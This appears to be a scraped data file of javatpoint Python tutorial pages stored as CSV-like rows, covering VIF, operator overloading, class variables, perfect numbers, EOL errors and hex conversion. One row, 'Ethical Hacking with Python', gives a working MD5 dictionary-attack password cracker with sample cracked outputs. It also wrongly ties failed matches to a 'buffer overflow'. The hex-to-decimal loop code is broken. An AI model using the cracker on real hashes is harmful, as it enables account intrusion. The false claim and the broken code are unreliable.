259,['vif in Python'],"['Before discussing about the vif, it is essential to understand first what is multicollinearity in linear regression?']","['https://www.javatpoint.com/__add__-in-python', 'https://www.javatpoint.com/cos-in-python']","['https://static.javatpoint.com/python/images/vif-in-python.png', 'https://static.javatpoint.com/python/images/vif-in-python2.png']",[],"['What is Correlation?', 'Checking Multicollinearity']","['Plotting a heatmap to comprehend the correlation', 'Use Variance Inflation Factor']",[],"['The situation of multicollinearity arises when two independent variables have a strong correlation.', 'Whenever we perform exploratory data analysis, the objective is to obtain a significant parameter that affects our target variable.', 'Therefore, correlation is the major step that helps us to understand the linear relationship that exists between two variables.', 'Correlation measures the scope to which two variables are interdependent.', 'Concerning statistics, we can obtain the correlation using Pearson Correlation. It gives us the correlation coefficient and the P-value.', 'Let us have a look at the criteria-', ""Let's discuss what kind of issues can occur because of multicollinearity-"", 'The two methods of checking the multicollinearity are-', 'Let us have a look at a program that shows how it can be implemented.', 'The Variance Inflation Factor is the measure of multicollinearity that exists in the set of variables that are involved in multiple regressions.', 'Generally, the vif value above 10 indicates that there is a high correlation with the other independent variables.', 'Let us have a look at a program that shows how it can be implemented.']","['A visual idea of checking what kind of a correlation exists between the two variables. We can plot a graph and interpret how does a rise in the value of one attribute affects the other attribute.', 'Since now we have a detailed idea of correlation, we now understood that if a strong correlation exists between two independent variables of a dataset, it leads to multicollinearity.', 'Taking a dataset, and plotting a heatmap will help us to infer which attribute has the most significant value of correlation. This value will tell us the extent of influence between the dependent variable and the independent variable.']",[],"['import matplotlib.pyplot as plt', 'import pandas as pd', 'import seaborn as sns', '# importing the data', 'df = pd.read_csv(""/content/SampleSuperstore.csv"")', 'print(df.corr())', '# plotting the correlation heatmap', 'df_plot = sns.heatmap(df.corr(), cmap=""YlGnBu"", annot=True)', '# displaying the heatmap', 'plt.show()', 'from statsmodels.stats.outliers_influence import variance_inflation_factor', 'from statsmodels.tools.tools import add_constant', 'import pandas as pd', 'df = pd.DataFrame(', ""{'x': [2, 2, 4, 1, 3],"", ""'y': [1, 1, 2, 3, 2],"", ""'z': [7, 4, 8, 6, 9],"", ""'w': [5, 4, 3, 4, 5]}"", 'X = add_constant(df)', 'ds=pd.Series([variance_inflation_factor(X.values, i)', 'for i in range(X.shape[1])],', 'index=X.columns)', 'print(ds)']",[],"['CORRELATION COEFFICIENT|||RELATIONSHIP&&&1. Close to +1|||Large Positive&&&2. Close to -1|||Large Negative&&&3. Close to 0|||No relationship exists', 'P-VALUE|||CERTAINITY&&&P-value<0.001|||Strong&&&P-value<0.05|||Moderate&&&P-value<0.1|||Weak&&&P-value>0.1|||No']","['|||Plotting a heatmap to comprehend the correlation|||Use Variance Inflation Factor|||&&&|||Since there is a strong relationship, determining the significant variables would be a difficult task.|||The coefficients that we will obtain for the variables can be unstable and as a consequence, the interpretation of a model would be a tedious job.|||Overfitting might occur and the accuracy of the model would change with the dataset.|||']"
260,['__add__ Method in Python'],"[""In this tutorial, we will discuss operator overloading, its advantages, and how we can overload the '+' operator.""]","['https://www.javatpoint.com/ethical-hacking-with-python', 'https://www.javatpoint.com/vif-in-python', 'https://www.javatpoint.com/ethical-hacking-with-python', 'https://www.javatpoint.com/vif-in-python', 'https://www.javatpoint.com/ethical-hacking-with-python']",[],[],['Advantages of Operator Overloading'],[],[],"['Before discussing about the __add__ method, let us understand what operator overloading is.', 'Operator overloading enables us to create a definition of the existing operators so that we can use them for user-defined data types as well.', 'Consider the following examples-', ""In the first example, the '+' operator is used to add two integers."", ""ii) 'JavaTpoint' + 'Tutorials'"", ""In the second example, the '+' operator is used to concatenate two strings."", 'iii) list1+list2 ', ""In the third example, the '+' operator is used to combine the elements of two lists."", ""This makes it clear that based on the data type, the '+' operator works differently in different situations."", ""It's time to deep dive into the world of applications where we will see how the operator '+' can be overloaded."", 'The function that we will use for the same is __add__.', 'In the first program, we will discuss how we can add two complex numbers.', 'Explanation -', 'The next method, decValue is used to pass the values of real and imag.', 'Finally, the display method would display the desired output in the provided format.', 'Explanation - ', 'Moving on to the next, we will add the marks of students, for this we have used for loop to append the marks in the list.', 'Finally, the display method would display the desired output in the provided format.', 'So, in this article, we learned how we can use __add__ in our Python program.']",[],"[""In the above program, we have created a class named 'Complex' and defined some class methods. The first method uses __init__ which is a class constructor, it is important to use this since it initializes the variables of the class object. Next, we can see the keyword 'self' here which refers to the object itself."", 'Moving on to the next, we will add the two complex numbers where the real part of the first number will be added to the real part of the second number and the imaginary part of the first number will be added to the imaginary part of the second number.', ""In the above program, we have created a class named 'Student' and defined some class methods. The first method uses __init__ which is a class constructor, it is important to use this since it initializes the variables of the class object. Next, we can see the keyword 'self' here which refers to the object itself.""]","['class Complex:', 'def __init__(self):', 'self.real=0', 'self.imag=0', 'def decValue(self,real,imag):', 'self.real=real', 'self.imag=imag', 'def __add__(self,C):', 'temp=Complex()', 'temp.real=self.real+C.real', 'temp.imag=self.imag+C.imag', 'return temp', 'def display(self):', 'print(""("",self.real, ""+"", self.imag,""i)"")', 'C1=Complex()', 'C1.decValue(10,12)', 'C2=Complex()', 'C2.decValue(8,6)', 'C3=Complex()', 'C3=C1+C2', 'print(""The result of the addition of two complex numbers is: "")', 'C3.display()', 'class Student:', 'def __init__(self,name,marks):', 'self.name=name', 'self.marks=marks', 'def display(self):', 'print(self.name,self.marks)', 'def __add__(self,S):', 'temp=Student(S.name,[])', 'for i in range(len(self.marks)):', 'temp.marks.append(self.marks[i]+S.marks[i])', 'return temp', 'S1=Student(""Aarav"",[90,91,88])', 'S2=Student(""Aarav"",[88,86,87])', 'S1.display()', 'S2.display()', 'S3=Student("""",[])', 'S3=S1+S2', 'S3.display()']","['The result of the addition of two complex numbers is:', '( 18 + 18 i)', 'Aarav [90, 91, 88]', 'Aarav [88, 86, 87]', 'Aarav [178, 177, 175]']",[],['|||The same operator can be used for different user-defined objects.|||The syntactic support which can be observed in the case of built-in data types is provided for user-defined types as well.|||This concept has an essential role in understanding scientific computations.|||The program looks lucid and easy to comprehend.|||']
261,['Ethical Hacking with Python'],"['A computer science engineer, a part of encrypting the world, must know the basics of hacking. Hacking is the process of getting access to a system of which we are not supposed to have.']","['https://www.javatpoint.com/class-variable-vs-instance', 'https://www.javatpoint.com/__add__-in-python', 'https://www.javatpoint.com/https://www.javatpoint.com/ethical-hacking', 'https://www.javatpoint.com/https://www.javatpoint.com/ethical-hacking-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/types-of-hackers', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/class-variable-vs-instance', 'https://www.javatpoint.com/__add__-in-python', 'https://www.javatpoint.com/class-variable-vs-instance']",[],[],"['Ethical Hacking', 'Why the user should user Python programming for hacking?', 'Conclusion']",['How Passwords are Hacked?'],[],"['There are different types of hackers, following are some:', 'These types of hacking attacks are considered ""Dictionary Attacks"".', '# # # # # # Password Hacking # # # # # #', 'Please enter the hashed password: 33816712db4f3913ee967469fe7ee982', 'Please enter the passwords file name including its path (root / home/): passwords.txt', 'The password is not found in the passwords.txt file.', 'Explanation:', 'In this tutorial, we have discussed ethical hacking in Python, and we have also shown an example of how to hack a password.']","['So, the user has to take the input_hashed(which is the hashed password stored in the database), and then they have to try to compare it with the hashed(md5) of each plain text password which can be found in the password file.']","['Such as login in to the email account without authorization is a part of hacking that account. Getting access to the computer or mobile phone without authorization is hacking. There is a large number of ways the user can hack into the system, and the basic concept of hacking is the same, breaking into the system without any authentication.', 'Ethical hacking is not limited to cracking passwords or stealing data. Ethical hacking is used for scanning vulnerabilities and for finding potential threats on the computer system or networks. Ethical hackers find the weak points or loopholes in the system, applications, or networks and report them to the organization.', ""The Python language is used widely for general purposes, and it's a high-level programming language. It is a very simple and powerful scripting language that is open source and object-oriented. Python has inbuilt libraries which can be used for various functions, and hacking is one of them. Python is very popular, and it has great demand in the market. Learning how to hack using Python will the great for an understanding language better."", 'As we know that the passwords of websites or files are not stored in the form of plain text in the database of websites. In this tutorial, we are going to hack the plain text, which is secured by a password. In the plain text, the passwords are stored in the hashed (md5) format.', 'When the match of the hashed password is found, the user can display the plain text password, which is stored in the file of passwords. But if the password is not found in the file of input passwords, then it will display that ""Password is not found"", this happens only when the buffer overflow does occur.', 'In the above code, the we first imported the ""hashlib"" module as it contains various methods which can handle hashing any raw message in the encrypted method. Then the user has to input the hashed password and the location of the passwords text file. Then, the user is trying to open the text file, but if the text file is not found at the mentioned location, it will print the error of ""File not found"".', 'Then, we compare the input hashed password with the hashed words present in the text file to find the correct password; for that, we have to encode the words into the utf-8 format and then hash the words into md5 hash. Then digest the hashed word into hexadecimal values.', 'If the digested value is equal to the input hash password, it will print the password found and print the correct password value. But if the password is not found, that means the digested value does not match with the input hash password. It will print ""Password is not found"".']","['import hashlib', 'print(""# # # # # #  Password Hacking # # # # # #"")', '', '# to check if the password is found or not in the text file.', 'password_found = 0', 'input_hashed = input("" Please enter the hashed password: "")', 'password_document = input("" \\n Please enter the passwords file name including its path (root / home/): "")', '# here, we will try to open the passwords text file.', ""password_file = open(password_document, 'r')"", 'except:', 'print(""Error: "")', 'print(password_document, ""is not found.\\n Please enter the path of file correctly."")', 'quit()', '# now, for comparing the input_hashed with the hashes of the words present in the password text file for finding the password.', 'for word in password_file:', '# to encode the word into utf-8 format', ""encoding_word = word.encode('utf-8')"", '', '# to Hash the word into md5 hash', 'hashed_word = hashlib.md5(encoding_word.strip())', '# to digest that the hash into the hexadecimal value', 'digesting = hashed_word.hexdigest()', 'if digesting == input_hashed:', '# to compare the hashes', 'print (""Password found.\\n The required password is: "", word)', 'password_found = 1', 'break', '# if the password is not found in the text file.', 'if not password_found:', 'print("" The password is not found in the "", password_document, ""file"")', ""print('\\n')"", 'print("" # # # # # # Thank you # # # # # # "")', '# # # # # #  Password Hacking # # # # # #', 'Please enter the hashed password:  1f23a6ea2da3425697d6446cf3402124', 'Please enter the passwords file name including its path (root / home/):  passwords.txt', '# # # # # #  Password Hacking # # # # # #', 'Please enter the hashed password:  b24aefc835df9ff09ef4dddc4f817737', 'Please enter the passwords file name including its path (root / home/):  passwords.txt']","['Password found.', 'The required password is:  manchester123', '# # # # # # Thank you # # # # # #', 'Password found.', 'The required password is:  heartbreaker07', '# # # # # # Thank you # # # # # #']",[],"[""|||Black Hat Hackers|||The Black Hat Hackers are the people who entered inside the website unethically for stealing data from the admin portal or to manipulate the data. They basically do this for their profit or to take advantage of personal data. Their main purpose is to cause major damage to the company, and this can even lead to dangerous consequences.|||White Hat Hacker|||They type of hackers work for finding bugs and report them ethically to the organizations or firms. They are authorized as the user for testing and checking bugs in the networks or websites and report back to the developers or authorized people. The white-hat hacker usually gets all the required information about the website or network system they are testing from the firm itself. They hacked the system with authorization. They do this so; they can save the website from malicious hackers in the future.|||Grey Hat Hackers|||These types of hackers get access to the data of the website or network and violate cyber law. But they don't have the same intentions as the Black Hat Hackers do. They hack the system for the common good, but they as different from white hat hackers, as they exploit vulnerability publicly, and the white hat hackers do it privately for the firm or organization.|||""]"
262,['Difference between Class Variable and Instance'],['Object-oriented programming lets the developers use variables at the class level or the instance level. Variables are necessary symbols standing in for a value we are utilizing in a program.'],"['https://www.javatpoint.com/perfect-number-in-python', 'https://www.javatpoint.com/ethical-hacking-with-python', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/perfect-number-in-python', 'https://www.javatpoint.com/ethical-hacking-with-python', 'https://www.javatpoint.com/perfect-number-in-python']",[],[],"['Variable in Python', 'Understanding the Class Variables', 'Understanding the Instance Variables', 'Understanding the difference between the Class Variable and Instance Variable']",[],[],"['Variables at the class level are known as class variables, whereas variables at the instance level are known as instance variables.', ""So, let's get begun."", 'Let us consider the following syntax of a class variable.', 'The ""var"" variable is assigned the ""xyz"" value in the above snippet of code.', 'We can define an object of the Class_name class (we will call it ""myObj"") and print the variable with the help of the dot notation:', 'Let us consider the following example based on the concept of Class Variable.', 'Explanation:', 'Let us try adding multiple class variables to the class and print their values.', 'Explanation:', 'Different from class variables, instance variables are defined within the functions.', 'The syntax to use the instance variables is shown below.', 'In the above snippet of code, var1 and var2 are instance variables.', 'Let us consider an example based on Instance Variables', 'Explanation:', 'As a result, we will obtain a made-up of the values of the variables initialized for the Instance of dBase.', 'Instance variables, owned by the class objects, enable the developers to store different values in each instance assigned to those variables.']","['In the following tutorial, we will understand the class as well as instance variables in Object-Oriented Programming in the Python programming language. We will also discuss the fundamental differences between these two variables.', 'Class Variables are defined outside of all the methods by convention, classically placed right under the header class and before the method of constructor and other functions.', 'Moreover, we can also observe that the object of myAnimal is accessible to all the variables in the class and print them out when we execute the program.', 'Class variables enable us to define variables upon the construction of the class. These variables and their corresponding values are then accessible to every object of the class.', 'Variables that are owned by the class instances are known as instance variables. This statement implies that for every instance or object of a class, the instance variables are unlike.']","['Whenever we expect that the variables are about to be consistent across instances, or whenever we have to initialize a variable, then that variable can be defined at the class level. Whenever we look forward to the variables that will alter significantly across instances, then that variable can be defined at the instance level.', ""Among various principles of software development is the principle of DRY, which is abbreviated for Don't Repeat Yourself. This principle is focused towards restrictive replication within the code, and object-oriented programming obeys the DRY principle since it decreases redundancy."", 'Class Variables are declared inside the construction of class. Since these variables are owned by the class itself, they are shared by all class instances. They, therefore, will usually have the equivalent value for each instance unless we are utilizing the class variable in order to initialize a variable.', 'In the above snippet of code, we have defined a class as ""Animal"" and declared the class variable. We have then instantiated the class with the my_Animal object and printed the final value for the users. As a result, the program returns the value of the class variable.', 'In the above snippet of code, we have defined a class and declared some variables to the class. We have then instantiated the class and printed the required output for the users. We can observe that these class variables can contain any data type available to us in Python. As in the above program, we have strings and an integer.', 'In the above snippet of code, we have defined a Student class and defined some variables as id, name, and age passed as arguments within the constructor method. We have then instantiated the class and print the values of the instance variables for the users.', 'Since we have understood the basic concepts of both the variables and how these variables are used in the class, let us understand how class variable differs from the instance variable. The major differences between these two variables are described in the tabular format shown below:']","['# defining the class', 'class Class_name:', '# declaring the variable in the class', 'var = ""xyz""', '# defining the class', 'class Class_name:', '# declaring the variable in the class', 'var = ""xyz""', '# instantiating the class', 'myObj = Class_name()', '# defining a class', 'class Animal:', '# declaring the class variable', 'Terrestrial = ""Lion""', '# instantiating the class', 'my_Animal = Animal()', '# printing the values', 'print(""Name of the Animal:"", my_Animal.Terrestrial)', '# defining a class', 'class Animal:', '# declaring some class variables', 'Terrestrial = ""Lion""', 'Location = ""Jungle""', 'Type = ""Carnivore""', 'Population = 20000', '# instantiating the class', 'my_Animal = Animal()', '# printing the values', 'print(""Name of the Animal:"", my_Animal.Terrestrial)', 'print(""This Animal is found in:"", my_Animal.Location)', 'print(""This Animal is a:"", my_Animal.Type)', 'print(""Population of this Animal:"", my_Animal.Population, ""approx."")', '# defining the class', 'class Class_name:', '# using the initializing function', 'def __init__(self, var1, var2):', 'self.var1 = var1', 'self.var2 = var2', '# defining the class', 'class Student:', '# using the initializing function', 'def __init__(self, id, name, age):', 'self.id = id', 'self.name = name', 'self.age = age', '#  instantiating the class', 'dBase = Student(102, ""Sam"", 13)', '# printing the required values', 'print(""Roll Number of the Student:"", dBase.id)', 'print(""Name of the Student:"", dBase.name)', 'print(""Age of the Student:"", dBase.age)']","['Name of the Animal: Lion', 'Name of the Animal: Lion', 'This Animal is found in: Jungle', 'This Animal is a: Carnivore', 'Population of this Animal: 20000 approx.', 'Roll Number of the Student: 102', 'Name of the Student: Sam', 'Age of the Student: 13']","['S. No.|||Class Variable|||Instance Variable&&&1|||A class variable is a variable that defines a particular property or attribute for a class.|||An instance variable is a variable whose value is specified to the Instance and shared among different instances.&&&2|||We can share these variables between class and its subclasses.|||We cannot share these variables between classes. However, they only fit in a particular class.&&&3|||It generally supports a single shared value for every instance of class even if there is no instance object present in the class.|||It generally stores memory for data required by the class.&&&4|||It is usually defined whenever we begin the execution of the program.|||It is usually defined whenever we create an instance of the class.&&&5|||It generally recollects the values until the program ends.|||It generally recollects the values as long as the object exists.&&&6|||It has only one replica of the class variable, so it is shared between various class objects.|||It has multiple replicas, so each object has its replica of the instance variable.&&&7|||We can access these variables by calling with the class name.|||We can access these variables directly by calling variable names within the class.&&&8|||We have to declare these variables with the help of the static keyboard.|||We have to declare these variables without utilizing the static keyword.&&&9|||Whatever alterations we made to these variables via one object will be replicated in another object.|||Whatever alterations we made to these variables via one object will not be replicated in another object.']",[]
263,['Perfect Number in Python'],"['Playing with numbers is something that we are doing since our childhood. The basic arithmetic operations performed on numbers generate valuable results. In the voyage of learning, we must give more emphasis to the logic develop in mathematics as they become the foundation of programming.']","['https://www.javatpoint.com/eol-in-python', 'https://www.javatpoint.com/class-variable-vs-instance', 'https://www.javatpoint.com/eol-in-python', 'https://www.javatpoint.com/class-variable-vs-instance', 'https://www.javatpoint.com/eol-in-python']",[],[],[],[],[],"[""So, let's get started…"", 'First, let us understand what is a perfect number?', 'A perfect number is a number in which the sum of the divisors of a number is equal to the number.', 'Make sure that we have to exclude the number when we are calculating the sum of divisors.', 'Now, we will see what are the steps involved in determining the perfect number.', ""It's time to have a look at the Python program-"", 'Explanation - ', 'In the program given above, we have-', 'Let us have a look at another program where we will implement the same with the help of a function.', 'Example - 2:', 'Explanation -', 'Because the return statement is present at the end of a function definition, it gives the value as True and False.']","['In this article, let us discuss what is a perfect number, what are the steps to determine whether a number is perfect or not, and finally, we shall see how its program can be written in Python.', 'In this program, we have used steps similar to the ones we discussed in the previous example, the only difference is here we have defined a function and called it by providing a value.', 'So, in this tutorial, we learned about perfect numbers, the process that we must follow to determine whether the given number is perfect or not, and at the end discussed its implementation in Python.']",[],"['num=int(input(""Enter the number: ""))', 'sum_v=0', 'for i in range(1,num):', 'if (num%i==0):', 'sum_v=sum_v+i', 'if(sum_v==num):', 'print(""The entered number is a perfect number"")', 'print(""The entered number is not a perfect number"")', 'def num_perfect(num):', 'sum_n = 0', 'for i in range(1, num):', 'if num % i == 0:', 'sum_n=sum_n+i', 'return sum_n == num', 'print(num_perfect(25))']","['Enter the number: 6', 'The entered number is a perfect number', 'Enter the number: 25', 'The entered number is not a perfect number', 'False']",[],"[""|||First of all, we will ask the user to input an integer which will be stored in a variable.|||Now, we will declare a variable called 'sum', where we will store the sum of the divisors of the given number.|||The next task is, to use a for loop where we will divide our number with the number initialized for the variable i, then we'll increment the value of I and check what are the numbers give us the remainder as zero. These numbers will be our divisors.|||Now we will take each of the divisors of that number and add it with the variable 'sum'.|||Finally, we will use the decision statement keyword 'if' to compare the number given by user with the value of the sum.|||If the values are equal, we will display the result as 'It's a perfect number', else we will display, 'It's not a perfect number'.||||||We have a variable 'num' and asked the user to provide its value.|||As discussed earlier, we have declared the variable sum_v as zero.|||Now, we have used the for loop whose range is from 1 to the number provided by the user.|||The next step is to check whether the number when divided with all the numbers provided in the range gives the remainder as zero.|||Those values will be added and then stored in the variable sum_v.|||Finally, we will make use of 'if' to compare the sum of divisors with the number and display the required result.|||In this program, the user has given the values 6 and 25 and the desired output is displayed.|||""]"
264,['EOL in Python'],"['As we know that a programming language like Python is an Interpreted language, which essentially implies that every block or line of code is processed one after one, rather than changing the whole program to a low-level code altogether.']","['https://www.javatpoint.com/python-program-to-convert-hexadecimal-string-to-decimal-string', 'https://www.javatpoint.com/perfect-number-in-python', 'https://www.javatpoint.com/python-program-to-convert-hexadecimal-string-to-decimal-string', 'https://www.javatpoint.com/perfect-number-in-python', 'https://www.javatpoint.com/python-program-to-convert-hexadecimal-string-to-decimal-string']",[],[],"['Understanding the meaning of EOL', 'Fixing the ""Syntax Error: EOL while scanning string literal.""', 'String constant stretching to multiple lines', 'Using backslash before the ending quotation mark']","['Missing the ending quotation mark', 'Using the incorrect ending quotation mark']",[],"['Let us consider a basic example demonstrating how the EOL error is raised.', 'Explanation:', 'Now that we have understood the issue let us understand some instances where this error can appear while executing a python code.', 'We can encounter this error in four main situations while working on a Python program. These four main situations are as shown below:', 'Let us begin to understand each of these situations and try to work around them.', 'Explanation:', 'Let us now consider the following syntax as the solution for the above problem.', 'Explanation:', 'Let us consider such a situation in the following example:', 'Explanation:', 'In the above snippet of code, we have used the incorrect quotation mark at the end of the string value that results in the syntax error.', 'We can avoid such a problem by using the matching quotation mark at the end of the string, as shown in the following snippet of code.', 'Explanation:', 'In the above snippet of code, as we can observe, we have used the matching quotation mark at the end of the string that helps us avoid any EOL error.', 'Let us consider an example demonstrating the same problem.', 'Problem Example:', 'Explanation:', 'However, we can solve this problem using various methods as shown below:', ""Solution 1: Using the '\\n' to provide the effect of a new line to the string constant"", 'Explanation:', 'Now let us consider another solution.', 'Solution 2: Using triple quotation marks, \'\'\' or """""" to store multi-line string constants', 'Explanation:', 'In the above snippet of code, we have used the triple quotation mark, """""" in order to store multi-line string constants.', ""The backslash '\\' is responsible for escaping the string and causes the syntax error."", 'Let us consider the following example.', 'Explanation:', 'We can solve this problem using the following snippet of code.', 'Explanation:']","['In the following tutorial, we will be going to discover one of the syntax errors in Python known as EOL, which is usually raised when we try to scan a string literal.', 'We must understand the meaning of EOL effectively before solving a problem. EOL is short for ""End of Line"". The EOL error signifies that the Interpreter of Python reached the end of the line while scanning the string literal.', 'In the above snippet of code, we have defined a string literal; however, we have missed a quotation mark at the end of the string, which raised the syntax error called EOL while printing that string for the users.', 'In the output section, we can observe a small arrow pointing to the last character of the string, demonstrating that the error had occurred when the program tried to parse that segment of the statement.', ""As discussed in the previous snippet of code, the Python interpreter raises a syntax error whenever it reaches the string literal's end and discovers that the quotation mark is missing."", 'We can observe that the quotation mark at the end of the literal string is missing, which also justifies the syntax error. Every language has few fundamental rules regarding syntax, which, when violated, result in errors.', 'In the above snippet of code, we can observe that we have included the quotation mark at the end of the literal string. As a result, the string is printed for the users successfully without raising any Syntax error.', 'In the above snippet of code, we can observe that the code may look ordinary; however, as soon as the next line is begun, the Python interpreter puts an end to that statement raising a Syntax error for not enclosing the string constant.', ""In the above snippet of code, we have included the '\\n' in the string constant to provide the effect of a new line to it. As a result, the string constant breaks statement into multiple lines."", ""In the above snippet of code, we have used to backslash '\\' in order to separate the paths of the folder from each other. However, during the execution of the program, the Python interpreter raised the Syntax error."", 'The last backslash before the quotation mark escapes the string constant, and the Python interpreter considers \\"" as a single character. This escape sequence translates to a quotation mark ("").', ""In the above snippet of code, we have used the '\\\\' in the string constant. As a result, the Python interpreter executes that string without raising an error.""]","['Whenever the interpreter of Python scans a line of code and notices something unexceptional, it raises an error known as the Syntax Error. Generally, a missing bracket, missing ending quote, and other fundamental anomalies in the syntax are why the errors were raised.', 'The string literals, also known as constants, must be enclosed in single or double quotation marks. Reaching the ""End of Line"" when we attempt to scan means that we have reached the last character of the string and have not encountered the ending quotation marks.', 'We can make use of "" "" as well as \' \' in order to enclose a certain string constant in Python. However, a programmer often uses an incorrect quotation mark at the end of the string value. Such a situation causes the program to raise a Syntax error in terms of EOL.', ""There are various novice Python programmers that make the mistake of stretching statements to more than one line. Python takes into account a new line as the end of the statement, unlike other languages such as C++ and Java that consider ';' as the end of statements.""]","['# defining a string value', 'my_string = ""This is my string literal, and it is broken...', '# printing the string value', 'print(""String:"", my_string)', '# defining a string value', 'my_string = ""This is my string literal, and it is broken...', '# printing the string value', 'print(""String:"", my_string)', '# defining a string value', 'my_string = ""This is my string literal, and it is broken...""', '# printing the string value', 'print(""String:"", my_string)', '# defining a string value', 'my_string = ""This is my string literal with wrong quotation mark at the end.\'', '# printing the string value', 'print(""String:"", my_string)', '# defining a string value', 'my_string = ""This is my string literal with wrong quotation mark at the end.""', '# printing the string value', 'print(""String:"", my_string)', '# defining a string value', 'my_string = ""This is my string literal...', 'this is my new line""', '# printing the string value', 'print(""String:"", my_string)', '# defining a string value', 'my_string = ""This is my string literal...\\n this is my new line""', '# printing the string value', 'print(""String:"", my_string)', '# defining a string value', 'my_string = """"""This is my string literal...', 'this is my new line""""""', '# printing the string value', 'print(""String:"", my_string)', '# storing a directory path', 'my_string = ""D:\\Python\\My_Folder\\""', '# printing the string value', 'print(""String:"", my_string)', '# storing a directory path', 'my_string = ""D:\\\\Python\\\\My_Folder\\\\""', '# printing the string value', 'print(""String:"", my_string)']","['File ""D:\\Python\\ternarypy.py"", line 2', 'my_string = ""This is my string literal, and it is broken...', '^', 'SyntaxError: EOL while scanning string literal', 'String: This is my string literal, and it is broken...', 'File ""D:\\Python\\ternarypy.py"", line 2', 'my_string = ""This is my string literal with wrong quotation mark at the end.\'', '^', 'SyntaxError: EOL while scanning string literal', 'String: This is my string literal with wrong quotation mark at the end.', 'File ""D:\\Python\\ternarypy.py"", line 2', 'my_string = ""This is my string literal...', '^', 'SyntaxError: EOL while scanning string literal', 'String: This is my string literal...', 'this is my new line', 'String: This is my string literal...', 'this is my new line', 'File ""D:\\Python\\ternarypy.py"", line 2', 'my_string = ""D:\\Python\\My_Folder\\""', '^', 'SyntaxError: EOL while scanning string literal', 'String: D:\\Python\\My_Folder\\']",[],['|||Missing the ending quotation mark|||Using the incorrect ending quotation mark|||String constant stretching to multiple lines|||Using backslash before the ending quotation mark|||']
265,['Python Program to convert Hexadecimal String to Decimal String'],"['In Python, it is very easy to convert elements comparing with other programming languages. In this tutorial, we will discuss different methods for converting hexadecimal string to decimal string.']","['https://www.javatpoint.com/different-methods-in-python-for-swapping-two-numbers-without-using-third-variable', 'https://www.javatpoint.com/eol-in-python', 'https://www.javatpoint.com/different-methods-in-python-for-swapping-two-numbers-without-using-third-variable', 'https://www.javatpoint.com/eol-in-python', 'https://www.javatpoint.com/different-methods-in-python-for-swapping-two-numbers-without-using-third-variable']",[],[],[],"['Method 1: By using int() function', 'Method 2: by using ast.literal_eval() method', 'Method 3: By using dictionary', 'Method 4: By using while Loop']",[],[],"['The int() function is used for performing these types of tasks, the user can add an argument (16) in this function for converting the hexadecimal string to the base 16, and it will convert the string into an integer at the same time.', 'The user can use the literal evaluation function for converting hexadecimal string to decimal string. The literal evaluation function can predict the base and convert the number string into the decimal string.']","['The user can use the dictionary for converting hexadecimal string to decimal string. They can create a dictionary that contains all the predefined values of the hexadecimal table. After this, the user can apply the ""for"" loop and convert the hexadecimal string value into the decimal string format.', 'The user can use the while loop for converting the hexadecimal string into a decimal string. First, the user has to import the hexadecimal string value. Then, they have to take 3 variables: ""k"", ""counts,"" and ""j"" and all equal to ""0"". After that, they have to apply the ""while"" loop containing all the conditions. And at last, the user can check the value of ""k"". If the value of ""k"" is equal to ""0"", the user can print the value of ""counts""; otherwise, it will be an invalid input.']","['# First, initialize the string', ""testing_string = 'F'"", '# then, Print the original string', 'print (""The Hexadecimal string is: "" + str(testing_string))', '# now, use the int() function to convert the hexadecimal string to decimal string', 'convertion = int(testing_string, 16)', '# At last, print result', 'print (""The converted hexadecimal string into decimal string is: "" + str(convertion))', 'from ast import literal_eval', '# First, initialize the string', ""testing_string = '0xF'"", '# then, Print the original string', 'print (""The Hexadecimal string is: "" + str(testing_string))', '# now, use the ast.literal_eval() function to convert the hexadecimal string to decimal string', 'convertion = literal_eval(testing_string)', '# At last, print result', 'print (""The converted hexadecimal string into decimal string is: "" + str(convertion))', '# Creating the Dictionary', ""dictionary_hexa_to_decimal = {'0': 0, '1' : 1, '2' : 2, '3' : 3, '4' : 4, '5' : 5, '6' : 6, '7' : 7, '8' : 8, '9' : 9, 'A' : 10 , 'B' : 11, 'C' : 12, 'D' : 13, 'E' : 14, 'F' : 15}"", 'hexadecimal_string = input(""Please enter the hexadecimal value: "").strip().upper()', 'decimal = 0', 'length = len(hexadecimal_string) -1', 'for digit in hexadecimal_string:', 'decimal += dictionary_hexa_to_decimal[digit]*16**length', 'length -= 1', 'print (""The converted hexadecimal string into decimal string is: "", decimal)', 'Please enter the hexadecimal value:  AE', 'hexadecimal_string = input(""Please enter the hexadecimal value: "")', 'k = counts = j = 0', 'length = len(hexadecimal_string) - 1', 'while length >= 0:', ""if hexadecimal_string[length] >= '0' and hexadecimal_string[length] <= '9':"", 'rem_1 = int(hexadecimal_string[length])', ""elif hexadecimal_string[length] >= 'A' and hexadecimal_string[length] <= 'F':"", 'rem_1 = ord(hexadecimal_string[length]) - 55', ""elif hexadecimal_string[len]>='a' and hexadecimal_string[len]<='f':"", 'rem_1 = ord(hexadecimal_string[length]) - 87', 'else:', 'k = 1', 'break', 'counts = counts + (rem * (16 ** j))', 'length = length - 1', 'j = j + 1', 'if k == 0:', 'print (""\\nThe converted hexadecimal string into decimal string is: "", counts)', 'print (""\\nInvalid Input!"")', 'Please enter the hexadecimal value:  AF']","['The Hexadecimal string is: F', 'The converted hexadecimal string into decimal string is: 15', 'The Hexadecimal string is: 0xF', 'The converted hexadecimal string into decimal string is: 15', 'The converted hexadecimal string into decimal string is:  174', 'The converted hexadecimal string into decimal string is:  255']",[],[]
266,['Different Methods in Python for Swapping Two Numbers without using third variable'],"['In this tutorial, we will discuss different methods used for swapping two variables (n1 and n2) without using a third variable in Python programs.']","['https://www.javatpoint.com/how-to-change-plot-size-in-matplotlib', 'https://www.javatpoint.com/python-program-to-convert-hexadecimal-string-to-decimal-string', 'https://www.javatpoint.com/how-to-change-plot-size-in-matplotlib', 'https://www.javatpoint.com/python-program-to-convert-hexadecimal-string-to-decimal-string', 'https://www.javatpoint.com/how-to-change-plot-size-in-matplotlib']",[],[],['Conclusion'],"['Method 1: By using inbuilt method', 'Method 2: By using Bitwise XOR operator', 'Method 3: By using Addition and Subtraction Operators', 'Method 4: By using Multiplication and Division Operators', 'Method 5: By using both Bitwise operators and Arithmetic operators']",[],"['The inbuilt method can work with any data type values such as string, float, it. This method is very easy to use.', 'This method can be used only for numerical values.', 'This method can be only used for numerical value except 0.', 'In this method, we will use both bitwise operators and arithmetic operators. This method only works with integers and not with float types.', 'In this tutorial, we have discussed different methods used for swapping values of two variables without using the third variable.']","['The Bitwise XOR method only works with integers, and it 